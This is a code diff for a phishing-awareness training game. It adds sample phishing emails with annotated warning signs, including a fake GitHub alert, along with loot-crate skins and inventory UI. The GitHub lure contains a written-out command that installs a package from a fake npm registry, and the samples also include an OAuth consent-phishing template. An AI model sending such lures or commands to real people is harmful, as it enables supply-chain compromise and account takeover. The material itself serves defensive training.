@@ -1048,14 +1048,246 @@ const EMAIL_DATABASE = [
     lesson:
       "Letters that look identical (l vs i) are used to spoof domains involving salary and commission to bypass your critical thinking.",
   },
+  // ==========================================
+  // NEW TIER 6: IMPOSSIBLE CHALLENGES
+  // ==========================================
+
+  {
+    id: 201,
+    app: "GitHub",
+    tier: 6,
+    isPhish: true,
+    sender: "security@github-security-alerts.com",
+    subject: "[URGENT] Dependabot: Critical RCE Vulnerability",
+    body: `
+      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; max-width: 600px; border: 1px solid #e1e4e8; border-radius: 6px;">
+        <div style="background-color: #24292e; padding: 20px; border-top-left-radius: 6px; border-top-right-radius: 6px;"><strong style="color: #ffffff; font-size: 20px;">GitHub</strong></div>
+        <div style="padding: 24px; background-color: #ffffff;">
+          <h2 style="font-size: 18px; color: #cb2431; margin-top: 0;">Critical Security Alert</h2>
+          <p style="color: #24292e; font-size: 14px;">
+            <span data-ioc-id="ioc-context" data-ioc-text="Behavioral Exploit: Targets developer reflexes. Devs are trained to panic and patch Critical Dependabot alerts immediately to avoid breaches.">Dependabot has detected a Critical Remote Code Execution (RCE) vulnerability in a core dependency for the repository <strong>core-infrastructure</strong>.</span>
+          </p>
+          <div style="background-color: #f6f8fa; padding: 12px; border-radius: 6px; margin: 16px 0; border: 1px solid #e1e4e8;">
+             <code style="font-family: monospace; font-size: 12px; color: #24292e;">
+               <span data-ioc-id="ioc-payload" data-ioc-text="Supply Chain Attack: The attacker is tricking the developer into running a malicious script by pointing the npm registry to a compromised domain.">npm install @patched/core-infrastructure --registry=https://npm-registry-patch.com</span>
+             </code>
+          </div>
+          <a href="#" data-ioc-id="ioc-link" data-ioc-text="Malicious Redirect: The button routes to a fake login portal to harvest developer credentials and bypass MFA." style="display: inline-block; background-color: #2ea44f; color: #ffffff; padding: 10px 20px; text-decoration: none; border-radius: 6px; font-weight: 600;">Review Vulnerability</a>
+        </div>
+      </div>
+    `,
+    iocs: [
+      {
+        id: "ioc-sender",
+        text: "Spoofed Sender: The domain is github-security-alerts.com, which is fake. GitHub uses github.com.",
+      },
+      {
+        id: "ioc-context",
+        text: "Behavioral Exploit: Targets developer reflexes. Devs are trained to panic and patch Critical Dependabot alerts immediately to avoid breaches.",
+      },
+      {
+        id: "ioc-payload",
+        text: "Supply Chain Attack: The attacker is tricking the developer into running a malicious script by pointing the npm registry to a compromised domain.",
+      },
+      {
+        id: "ioc-link",
+        text: "Malicious Redirect: The button routes to a fake login portal to harvest developer credentials and bypass MFA.",
+      },
+    ],
+    lesson:
+      "Impossible threats target highly technical users (like developers) using Supply Chain attacks and fake dependency patches.",
+  },
+
+  {
+    id: 202,
+    app: "Microsoft 365",
+    tier: 6,
+    isPhish: true,
+    sender: "no-reply@microsoft-admin-consent.com",
+    subject: "Action Required: Re-authorize Netskope Security Integration",
+    body: `
+      <div style="font-family: -apple-system, sans-serif; max-width: 600px; border: 1px solid #e5e5e5; border-radius: 8px;">
+        <div style="padding: 20px; text-align: center; border-bottom: 1px solid #e5e5e5; background-color: #f8fafc;"><strong style="color: #00a9e0; font-size: 24px;">Netskope Cloud Security</strong></div>
+        <div style="padding: 30px; background-color: #ffffff;">
+          <h2 style="font-size: 18px; color: #0f172a; margin-top: 0;">Authorization Required</h2>
+          <p style="color: #475569; font-size: 14px;">
+            <span data-ioc-id="ioc-context" data-ioc-text="OAuth Consent Phishing: By tricking you into granting permissions, attackers don't need your password. They just use the permissions you gave them.">The Netskope DLP integration requires updated permissions to scan your Microsoft 365 OneDrive files for sensitive data compliance.</span>
+          </p>
+          <div style="margin: 20px 0; padding: 15px; border-left: 4px solid #00a9e0; background: #f1f5f9;">
+            <p style="margin: 0; font-size: 12px; color: #334155; font-weight: bold;">Requested Permissions:</p>
+            <ul style="margin: 10px 0 0 0; font-size: 12px; color: #475569; padding-left: 20px;">
+              <li>Read and write all files in all site collections</li>
+              <li>Maintain access to data you have given it access to (Offline Access)</li>
+            </ul>
+          </div>
+          <a href="#" data-ioc-id="ioc-link" data-ioc-text="Illicit App Consent: The URL is technically a real Microsoft login link, but it authorizes a malicious third-party app controlled by the attacker." style="display: inline-block; background-color: #00a9e0; color: #ffffff; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: 600;">Grant App Permissions</a>
+        </div>
+      </div>
+    `,
+    iocs: [
+      {
+        id: "ioc-sender",
+        text: "Spoofed Domain: Official Microsoft consent requests do not come from hyphenated domains like microsoft-admin-consent.com.",
+      },
+      {
+        id: "ioc-context",
+        text: "OAuth Consent Phishing: By tricking you into granting permissions, attackers don't need your password. They just use the permissions you gave them.",
+      },
+      {
+        id: "ioc-link",
+        text: "Illicit App Consent: The URL is technically a real Microsoft login link, but it authorizes a malicious third-party app controlled by the attacker.",
+      },
+    ],
+    lesson:
+      "OAuth Consent Phishing is incredibly dangerous. The login screen is real, but the application you are granting permissions to is malicious.",
+  },
+
+  {
+    id: 203,
+    app: "Netskope Admin",
+    tier: 6,
+    isPhish: false,
+    sender: "system@netskope.com",
+    subject: "Tenant Upgrade Completed: Release 115",
+    body: `
+      <div style="font-family: -apple-system, sans-serif; max-width: 600px; border: 1px solid #e5e5e5; border-radius: 8px;">
+        <div style="padding: 20px; background-color: #001a47;"><strong style="color: #00a9e0; font-size: 22px;">Netskope</strong></div>
+        <div style="padding: 24px; background-color: #ffffff;">
+          <h2 style="font-size: 18px; color: #0f172a; margin-top: 0;">Tenant Upgrade Completed</h2>
+          <p style="color: #475569; font-size: 14px;">
+            <span data-ioc-id="ioc-context" data-ioc-text="Standard Administrative Notification: Automated platform maintenance updates are safe, routine events for security admins.">Your Netskope Security Cloud tenant has been successfully updated to Release 115. No downtime was experienced.</span>
+          </p>
+          <p style="color: #475569; font-size: 14px;">New features including Advanced RBI and SaaS Security Posture Management (SSPM) enhancements are now available.</p>
+          <a href="#" data-ioc-id="ioc-link" data-ioc-text="Secure Link: Safely routes directly to your authenticated Netskope Admin console." style="display: inline-block; background-color: #00a9e0; color: #ffffff; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold;">View Release Notes</a>
+        </div>
+      </div>
+    `,
+    iocs: [
+      {
+        id: "ioc-sender",
+        text: "Verified Domain: The email originated from the official netskope.com root domain.",
+      },
+      {
+        id: "ioc-context",
+        text: "Standard Administrative Notification: Automated platform maintenance updates are safe, routine events for security admins.",
+      },
+      {
+        id: "ioc-link",
+        text: "Secure Link: Safely routes directly to your authenticated Netskope Admin console.",
+      },
+    ],
+    lesson:
+      "At high tiers, you must fight paranoia! Routine system updates from exact root domains with no urgency are completely safe.",
+  },
 ];
 
+// ==========================================
+// FORENSIC MAGNIFIER SKINS (LOOT TABLE)
+// ==========================================
+const MAGNIFIER_SKINS: Record<string, any> = {
+  STANDARD: {
+    id: "STANDARD",
+    name: "Standard Issue",
+    rarity: "Common",
+    color: "#00a9e0",
+    filter: "blur(12px) brightness(1.1)",
+    shadow: "rgba(0, 169, 224, 0.2)",
+    handleColor: "#001a47",
+    handleGlow: "none",
+  },
+  AMBER: {
+    id: "AMBER",
+    name: "Amber Alert",
+    rarity: "Common",
+    color: "#ff7b00",
+    filter: "blur(12px) brightness(1.1)",
+    shadow: "rgba(255, 123, 0, 0.2)",
+    handleColor: "#431407",
+    handleGlow: "none",
+  },
+  MIDNIGHT: {
+    id: "MIDNIGHT",
+    name: "Midnight Ops",
+    rarity: "Common",
+    color: "#001a47",
+    filter: "blur(8px) brightness(0.6) contrast(1.5)",
+    shadow: "rgba(0, 26, 71, 0.5)",
+    handleColor: "#020617",
+    handleGlow: "none",
+  },
+  TERMINAL: {
+    id: "TERMINAL",
+    name: "Terminal Green",
+    rarity: "Rare",
+    color: "#10b981",
+    filter: "blur(10px) sepia(1) hue-rotate(70deg) brightness(0.8)",
+    shadow: "rgba(16, 185, 129, 0.4)",
+    handleColor: "#064e3b",
+    handleGlow: "0 0 15px rgba(16, 185, 129, 0.5)",
+  },
+  THERMAL: {
+    id: "THERMAL",
+    name: "Thermal Vision",
+    rarity: "Rare",
+    color: "#ef4444",
+    filter: "blur(12px) invert(1) hue-rotate(180deg)",
+    shadow: "rgba(239, 68, 68, 0.4)",
+    handleColor: "#7f1d1d",
+    handleGlow: "0 0 15px rgba(239, 68, 68, 0.5)",
+  },
+  GOLD: {
+    id: "GOLD",
+    name: "Executive Gold",
+    rarity: "Epic",
+    color: "#fbbf24",
+    filter: "blur(8px) brightness(1.3) contrast(1.2)",
+    shadow: "rgba(251, 191, 36, 0.6)",
+    handleColor: "#78350f",
+    handleGlow: "0 0 25px rgba(251, 191, 36, 0.8)",
+  }, // Deep wooden handle
+  NEON: {
+    id: "NEON",
+    name: "Neon Pulse",
+    rarity: "Epic",
+    color: "#ff00ff",
+    filter: "blur(12px) saturate(2.5) hue-rotate(90deg)",
+    shadow: "rgba(255, 0, 255, 0.6)",
+    handleColor: "#0df0d4",
+    handleGlow: "0 0 25px rgba(13, 240, 212, 0.8)",
+  }, // Cyan handle contrasting Magenta rim
+  ANOMALY: {
+    id: "ANOMALY",
+    name: "The Anomaly",
+    rarity: "Legendary",
+    color: "#0df0d4",
+    filter: "blur(16px) contrast(2) saturate(3) hue-rotate(-45deg)",
+    shadow: "rgba(13, 240, 212, 0.8)",
+    handleColor: "#ffffff",
+    handleGlow: "0 0 30px #ffffff",
+    isAnimated: true,
+  },
+};
+const getRarityColor = (rarity: string) => {
+  switch (rarity) {
+    case "Common":
+      return "#94a3b8"; // Gray
+    case "Rare":
+      return "#3b82f6"; // Blue
+    case "Epic":
+      return "#a855f7"; // Purple
+    case "Legendary":
+      return "#eab308"; // Gold
+    default:
+      return "#fff";
+  }
+};
+
 const BASE_LEADERBOARD = [
-  { id: "npc1", name: "SecOps_Ninja", xp: 1450, acc: "98%" },
-  { id: "npc2", name: "Alex_IT", xp: 1100, acc: "95%" },
-  { id: "npc3", name: "Sarah.Dev", xp: 800, acc: "97%" },
-  { id: "npc4", name: "Michael.HR", xp: 400, acc: "92%" },
-  { id: "npc5", name: "Dwight.S", xp: 200, acc: "89%" },
+  { id: "npc1", name: "SecOps_Ninja", xp: 3000, acc: "98%" },
+  { id: "npc2", name: "Alex_IT", xp: 2500, acc: "95%" },
+  { id: "npc3", name: "Sarah.Dev", xp: 1600, acc: "97%" },
+  { id: "npc4", name: "Michael.HR", xp: 1000, acc: "75%" },
+  { id: "npc5", name: "Dwight.S", xp: 600, acc: "40%" },
 ];
 
 export default function App() {
@@ -1077,6 +1309,15 @@ export default function App() {
     id: string;
     text: string;
   } | null>(null);
+  // --- INVENTORY & CRATE STATE ---
+  const [crates, setCrates] = useState(0);
+  const [inventory, setInventory] = useState<string[]>(["STANDARD"]);
+  const [equippedSkin, setEquippedSkin] = useState("STANDARD");
+  const [showInventory, setShowInventory] = useState(false);
+  const [showUnboxing, setShowUnboxing] = useState(false);
+  const [rouletteItems, setRouletteItems] = useState<any[]>([]);
+  const [wonSkin, setWonSkin] = useState<any>(null);
+  const [lastXpThreshold, setLastXpThreshold] = useState(0);
 
   // NEW: Force the app to ALWAYS find a Tier 1 email on startup
   const initialEmail =
@@ -1370,17 +1611,69 @@ export default function App() {
     .slice(0, 6);
 
   useEffect(() => {
+    // 1. RANK UP CHECK
     const newRank = getRankFromXp(xp);
     if (newRank !== rank && xp > 0) {
       setRank(newRank);
       setShowRankUp(true);
+      setCrates((prev) => prev + 1); // Rank up reward
+
       const rankUpSound = new Audio(
         "https://actions.google.com/sounds/v1/science_fiction/power_up_flash.ogg"
       );
       rankUpSound.volume = 0.6;
       rankUpSound.play().catch((e) => console.log(e));
     }
-  }, [xp, rank]);
+
+    // 2. 500 XP MILESTONE CHECK
+    const currentThreshold = Math.floor(xp / 500);
+    if (currentThreshold > lastXpThreshold) {
+      const cratesEarned = currentThreshold - lastXpThreshold;
+      setCrates((prev) => prev + cratesEarned);
+      setLastXpThreshold(currentThreshold);
+
+      const crateEarnedSound = new Audio(
+        "https://actions.google.com/sounds/v1/glass/glass_clink.ogg"
+      );
+      crateEarnedSound.volume = 0.3;
+      crateEarnedSound.play().catch((e) => console.log(e));
+    }
+  }, [xp, rank, lastXpThreshold]);
+
+  // CRATE UNBOXING LOGIC
+  const openCrate = () => {
+    if (crates <= 0) return;
+    setCrates((prev) => prev - 1);
+    setWonSkin(null);
+    setShowUnboxing(true);
+
+    const getRandomSkin = () => {
+      const roll = Math.random() * 100;
+      let rarity = "Common";
+      if (roll > 70 && roll <= 90) rarity = "Rare";
+      if (roll > 90 && roll <= 99) rarity = "Epic";
+      if (roll > 99) rarity = "Legendary";
+
+      const availableSkins = Object.values(MAGNIFIER_SKINS).filter(
+        (s) => s.rarity === rarity
+      );
+      return availableSkins[Math.floor(Math.random() * availableSkins.length)];
+    };
+
+    // Build the 50-item roulette wheel
+    const spinArray = Array.from({ length: 50 }, () => getRandomSkin());
+    const winningItem = spinArray[45]; // It stops on the 45th item
+
+    setRouletteItems(spinArray);
+
+    // Wait for the animation, then award the item
+    setTimeout(() => {
+      setWonSkin(winningItem);
+      if (!inventory.includes(winningItem.id)) {
+        setInventory((prev) => [...prev, winningItem.id]);
+      }
+    }, 5500);
+  };
 
   const getProgressPercentage = () => {
     if (xp >= RANK_THRESHOLDS.APEX) return 100;
@@ -1650,6 +1943,19 @@ export default function App() {
         >
           <Trophy size={16} /> Global Leaderboard
         </button>
+
+        {/* NEW: INVENTORY & CRATE BUTTON */}
+        <button
+          onClick={() => setShowInventory(true)}
+          className="sidebar-btn-secondary"
+          style={{
+            marginTop: "10px",
+            borderColor: crates > 0 ? "#ff7b00" : "#334155",
+            color: crates > 0 ? "#ff7b00" : "#94a3b8",
+          }}
+        >
+          {crates > 0 ? `📦 OPEN CRATE (${crates})` : "🎒 INVENTORY"}
+        </button>
       </aside>
 
       {/* 2 & 3. MAIN VIEW (INBOX + READING PANE) */}
@@ -1905,108 +2211,175 @@ export default function App() {
               />
             </div>
 
-            {/* NEUTRAL MAGNIFIER */}
-            {inspectorActive && (
-              <motion.div
-                className="magnifier"
-                animate={{ x: mousePos.x - 120, y: mousePos.y - 120 }}
-                transition={{ type: "tween", duration: 0 }}
-                style={{
-                  pointerEvents: "none",
-                  borderColor:
-                    hoveredIoC || foundIoCs.includes(hoveredIoC?.id || "")
-                      ? "#ca8a04"
-                      : "#eab308",
-                  boxShadow: hoveredIoC
-                    ? "0 0 60px rgba(0,0,0,0.6), inset 0 0 40px rgba(202,138,4,0.3)"
-                    : "0 0 60px rgba(0,0,0,0.6), inset 0 0 30px rgba(234,179,8,0.2)",
-                  background: hoveredIoC
-                    ? "rgba(0,0,0,0.85)"
-                    : "rgba(255,255,255,0.05)",
-                }}
-              >
-                {hoveredIoC ? (
-                  <div
+            {/* DYNAMIC SKINNED MAGNIFIER WITH HANDLE */}
+            {inspectorActive &&
+              (() => {
+                const skin = MAGNIFIER_SKINS[equippedSkin];
+                const isFinding =
+                  hoveredIoC || foundIoCs.includes(hoveredIoC?.id || "");
+
+                return (
+                  <motion.div
+                    className="magnifier"
+                    animate={{
+                      x: mousePos.x - 120,
+                      y: mousePos.y - 120,
+                      borderColor:
+                        skin.isAnimated && !isFinding
+                          ? ["#0df0d4", "#ff00ff", "#fbbf24", "#0df0d4"]
+                          : isFinding
+                          ? "#ff7b00"
+                          : skin.color,
+                    }}
+                    transition={
+                      skin.isAnimated && !isFinding
+                        ? { duration: 2, repeat: Infinity }
+                        : { type: "tween", duration: 0 }
+                    }
                     style={{
-                      padding: "20px",
-                      textAlign: "left",
-                      width: "100%",
+                      pointerEvents: "none",
+                      borderWidth: "6px", // Slightly thicker frame to support the handle
+                      borderStyle: "solid",
+                      position: "relative", // Ensures the handle stays attached to the lens
+                      overflow: "visible", // Allows the handle to stick out
+                      boxShadow: isFinding
+                        ? `0 0 60px rgba(0,0,0,0.6), inset 0 0 40px rgba(255,123,0,0.4)`
+                        : `0 0 60px rgba(0,0,0,0.6), inset 0 0 40px ${skin.shadow}`,
+                      backdropFilter: skin.filter,
                     }}
                   >
-                    <div
+                    {/* === THE NEW HANDLE === */}
+                    <motion.div
                       style={{
-                        color: "#ca8a04",
-                        fontWeight: 900,
-                        marginBottom: "10px",
-                        fontSize: "14px",
-                        textAlign: "center",
-                        textTransform: "uppercase",
+                        position: "absolute",
+                        top: "82%", // Mounts exactly to the bottom right curve
+                        left: "82%",
+                        width: "26px",
+                        height: "130px",
+                        borderRadius: "13px",
+                        transformOrigin: "top center",
+                        transform: "rotate(-45deg)", // Angles it down and to the right
+                        border: `3px solid ${
+                          isFinding ? "#ff7b00" : skin.color
+                        }`,
+                        zIndex: -1, // Tucks it neatly behind the rim of the glass
                       }}
-                    >
-                      <Fingerprint
-                        size={18}
-                        style={{ verticalAlign: "middle", marginRight: "5px" }}
-                      />{" "}
-                      EVIDENCE DETECTED
-                    </div>
-                    <div
-                      style={{
-                        background: "#000",
-                        padding: "10px",
-                        borderRadius: "4px",
-                        border: "1px solid #10b981",
-                        color: "#10b981",
-                        fontSize: "11px",
-                        fontFamily: "monospace",
-                        lineHeight: "1.4",
-                        fontWeight: 700,
+                      animate={{
+                        backgroundColor:
+                          skin.isAnimated && !isFinding
+                            ? ["#ffffff", "#0df0d4", "#ff00ff", "#ffffff"]
+                            : isFinding
+                            ? "#9a3412"
+                            : skin.handleColor,
+                        boxShadow:
+                          skin.isAnimated && !isFinding
+                            ? [
+                                "0 0 30px #ffffff",
+                                "0 0 30px #0df0d4",
+                                "0 0 30px #ff00ff",
+                                "0 0 30px #ffffff",
+                              ]
+                            : isFinding
+                            ? "0 0 20px #ff7b00"
+                            : skin.handleGlow,
                       }}
-                    >
-                      {hoveredIoC.text}
-                    </div>
-                    {!foundIoCs.includes(hoveredIoC.id) ? (
+                      transition={
+                        skin.isAnimated && !isFinding
+                          ? { duration: 2, repeat: Infinity }
+                          : { type: "tween", duration: 0 }
+                      }
+                    />
+
+                    {/* === INSIDE THE MAGNIFIER LENS === */}
+                    {hoveredIoC ? (
                       <div
-                        className="blink-text"
                         style={{
-                          fontSize: "10px",
-                          marginTop: "15px",
-                          color: "#ca8a04",
-                          fontWeight: 900,
-                          textAlign: "center",
+                          padding: "20px",
+                          textAlign: "left",
+                          width: "100%",
+                          zIndex: 2,
                         }}
                       >
-                        [ CLICK TO FLAG ]
+                        <div
+                          style={{
+                            color: "#ff7b00",
+                            fontWeight: 900,
+                            marginBottom: "10px",
+                            fontSize: "14px",
+                            textAlign: "center",
+                            textTransform: "uppercase",
+                          }}
+                        >
+                          <Fingerprint
+                            size={18}
+                            style={{
+                              verticalAlign: "middle",
+                              marginRight: "5px",
+                            }}
+                          />{" "}
+                          EVIDENCE DETECTED
+                        </div>
+                        <div
+                          style={{
+                            background: "#000",
+                            padding: "10px",
+                            borderRadius: "4px",
+                            border: "1px solid #10b981",
+                            color: "#10b981",
+                            fontSize: "11px",
+                            fontFamily: "monospace",
+                            lineHeight: "1.4",
+                            fontWeight: 700,
+                          }}
+                        >
+                          {hoveredIoC.text}
+                        </div>
+                        {!foundIoCs.includes(hoveredIoC.id) ? (
+                          <div
+                            className="blink-text"
+                            style={{
+                              fontSize: "10px",
+                              marginTop: "15px",
+                              color: "#ff7b00",
+                              fontWeight: 900,
+                              textAlign: "center",
+                            }}
+                          >
+                            [ CLICK TO FLAG ]
+                          </div>
+                        ) : (
+                          <div
+                            style={{
+                              fontSize: "10px",
+                              marginTop: "15px",
+                              color: "#10b981",
+                              fontWeight: 900,
+                              textAlign: "center",
+                            }}
+                          >
+                            [ EVIDENCE SECURED ]
+                          </div>
+                        )}
                       </div>
                     ) : (
                       <div
                         style={{
-                          fontSize: "10px",
-                          marginTop: "15px",
-                          color: "#10b981",
+                          fontSize: "11px",
                           fontWeight: 900,
-                          textAlign: "center",
+                          color: skin.color,
+                          textTransform: "uppercase",
+                          textShadow: `0 0 10px ${skin.color}`,
+                          zIndex: 2,
                         }}
                       >
-                        [ EVIDENCE SECURED ]
+                        <Search size={24} style={{ marginBottom: "8px" }} />
+                        <br />
+                        Scanning...
                       </div>
                     )}
-                  </div>
-                ) : (
-                  <div
-                    style={{
-                      fontSize: "11px",
-                      fontWeight: 900,
-                      color: "#eab308",
-                      textTransform: "uppercase",
-                    }}
-                  >
-                    <Search size={24} style={{ marginBottom: "8px" }} />
-                    <br />
-                    Scanning...
-                  </div>
-                )}
-              </motion.div>
-            )}
+                  </motion.div>
+                );
+              })()}
           </div>
 
           <AnimatePresence>
@@ -2574,6 +2947,316 @@ export default function App() {
           </motion.div>
         )}
       </AnimatePresence>
+
+      {/* NEW: INVENTORY MODAL */}
+      <AnimatePresence>
+        {showInventory && !showUnboxing && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="leaderboard-overlay"
+            onClick={() => setShowInventory(false)}
+          >
+            <div
+              className="leaderboard-modal"
+              onClick={(e) => e.stopPropagation()}
+            >
+              <button
+                className="close-btn"
+                onClick={() => setShowInventory(false)}
+              >
+                <X size={24} />
+              </button>
+              <h2
+                className="leaderboard-title"
+                style={{ textAlign: "center", marginBottom: "20px" }}
+              >
+                Forensic Armory
+              </h2>
+
+              {crates > 0 && (
+                <div
+                  style={{
+                    textAlign: "center",
+                    marginBottom: "30px",
+                    padding: "20px",
+                    background: "rgba(255,123,0,0.1)",
+                    borderRadius: "8px",
+                    border: "1px dashed #ff7b00",
+                  }}
+                >
+                  <h3 style={{ color: "#ff7b00", margin: "0 0 10px 0" }}>
+                    You have {crates} Encrypted Crate{crates > 1 ? "s" : ""}
+                  </h3>
+                  <button
+                    onClick={openCrate}
+                    style={{
+                      background: "#ff7b00",
+                      color: "#fff",
+                      padding: "10px 20px",
+                      border: "none",
+                      borderRadius: "4px",
+                      fontWeight: 900,
+                      cursor: "pointer",
+                      textTransform: "uppercase",
+                    }}
+                  >
+                    Decrypt Crate
+                  </button>
+                </div>
+              )}
+
+              <div
+                style={{
+                  display: "grid",
+                  gridTemplateColumns: "1fr 1fr",
+                  gap: "15px",
+                  maxHeight: "400px",
+                  overflowY: "auto",
+                }}
+              >
+                {Object.values(MAGNIFIER_SKINS).map((skin) => {
+                  const isOwned = inventory.includes(skin.id);
+                  const isEquipped = equippedSkin === skin.id;
+
+                  return (
+                    <div
+                      key={skin.id}
+                      style={{
+                        padding: "15px",
+                        background: "#0f172a",
+                        border: `2px solid ${isOwned ? skin.color : "#334155"}`,
+                        borderRadius: "8px",
+                        opacity: isOwned ? 1 : 0.5,
+                      }}
+                    >
+                      <div
+                        style={{
+                          color: getRarityColor(skin.rarity),
+                          fontSize: "10px",
+                          fontWeight: 900,
+                          textTransform: "uppercase",
+                        }}
+                      >
+                        {skin.rarity}
+                      </div>
+                      <div
+                        style={{
+                          color: "#fff",
+                          fontWeight: 700,
+                          margin: "5px 0",
+                        }}
+                      >
+                        {skin.name}
+                      </div>
+                      {isOwned ? (
+                        <button
+                          onClick={() => setEquippedSkin(skin.id)}
+                          style={{
+                            width: "100%",
+                            padding: "8px",
+                            marginTop: "10px",
+                            background: isEquipped ? skin.color : "transparent",
+                            color: isEquipped ? "#000" : skin.color,
+                            border: `1px solid ${skin.color}`,
+                            borderRadius: "4px",
+                            cursor: "pointer",
+                            fontWeight: "bold",
+                          }}
+                        >
+                          {isEquipped ? "EQUIPPED" : "EQUIP"}
+                        </button>
+                      ) : (
+                        <div
+                          style={{
+                            width: "100%",
+                            padding: "8px",
+                            marginTop: "10px",
+                            textAlign: "center",
+                            color: "#64748b",
+                            fontSize: "12px",
+                            fontWeight: "bold",
+                          }}
+                        >
+                          LOCKED
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* NEW: UNBOXING ROULETTE MODAL */}
+      <AnimatePresence>
+        {showUnboxing && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="leaderboard-overlay"
+          >
+            <div
+              className="leaderboard-modal"
+              style={{
+                width: "800px",
+                maxWidth: "90vw",
+                textAlign: "center",
+                overflow: "hidden",
+              }}
+            >
+              <h2
+                className="leaderboard-title"
+                style={{ marginBottom: "30px" }}
+              >
+                Decrypting Data...
+              </h2>
+
+              <div
+                style={{
+                  position: "relative",
+                  width: "100%",
+                  height: "120px",
+                  background: "#0f172a",
+                  border: "1px solid #334155",
+                  borderRadius: "8px",
+                  overflow: "hidden",
+                }}
+              >
+                {/* Center Reticle */}
+                <div
+                  style={{
+                    position: "absolute",
+                    left: "50%",
+                    top: 0,
+                    bottom: 0,
+                    width: "4px",
+                    background: "#ff7b00",
+                    zIndex: 10,
+                    transform: "translateX(-50%)",
+                    boxShadow: "0 0 15px #ff7b00",
+                  }}
+                />
+
+                {/* Spinning Track */}
+                <motion.div
+                  initial={{ x: 0 }}
+                  // Moves the track far left, stopping exactly on the 45th item
+                  animate={{ x: -(45 * 160 - 300) }}
+                  transition={{ duration: 5, ease: [0.15, 0.85, 0.2, 1] }} // Spin physics
+                  style={{
+                    display: "flex",
+                    height: "100%",
+                    position: "absolute",
+                    left: 0,
+                  }}
+                >
+                  {rouletteItems.map((item, i) => (
+                    <div
+                      key={i}
+                      style={{
+                        width: "160px",
+                        height: "100%",
+                        display: "flex",
+                        flexDirection: "column",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        borderRight: "1px solid #1e293b",
+                        background: `linear-gradient(to bottom, #0f172a, ${item.color}22)`,
+                      }}
+                    >
+                      <div
+                        style={{
+                          color: getRarityColor(item.rarity),
+                          fontSize: "12px",
+                          fontWeight: 900,
+                        }}
+                      >
+                        {item.rarity}
+                      </div>
+                      <div
+                        style={{
+                          color: "#fff",
+                          fontWeight: 700,
+                          marginTop: "5px",
+                        }}
+                      >
+                        {item.name}
+                      </div>
+                    </div>
+                  ))}
+                </motion.div>
+              </div>
+
+              {/* Reveal Winner */}
+              <div
+                style={{
+                  height: "100px",
+                  marginTop: "30px",
+                  display: "flex",
+                  justifyContent: "center",
+                  alignItems: "center",
+                }}
+              >
+                {wonSkin ? (
+                  <motion.div
+                    initial={{ scale: 0, opacity: 0 }}
+                    animate={{ scale: 1, opacity: 1 }}
+                    transition={{ type: "spring", bounce: 0.5 }}
+                  >
+                    <h3
+                      style={{
+                        color: getRarityColor(wonSkin.rarity),
+                        margin: "0 0 10px 0",
+                        textTransform: "uppercase",
+                        letterSpacing: "2px",
+                      }}
+                    >
+                      {wonSkin.rarity} UNLOCKED
+                    </h3>
+                    <h1
+                      style={{
+                        color: wonSkin.color,
+                        margin: 0,
+                        textShadow: `0 0 20px ${wonSkin.color}`,
+                      }}
+                    >
+                      {wonSkin.name}
+                    </h1>
+                    <button
+                      onClick={() => {
+                        setShowUnboxing(false);
+                        setShowInventory(true);
+                      }}
+                      style={{
+                        marginTop: "20px",
+                        background: "transparent",
+                        color: "#fff",
+                        border: "1px solid #fff",
+                        padding: "8px 16px",
+                        borderRadius: "4px",
+                        cursor: "pointer",
+                      }}
+                    >
+                      Continue
+                    </button>
+                  </motion.div>
+                ) : (
+                  <div style={{ color: "#64748b", fontWeight: 800 }}>
+                    Analyzing cryptographic hashes...
+                  </div>
+                )}
+              </div>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* This is the final closing for the main app container div */}
     </div>
   );
 }
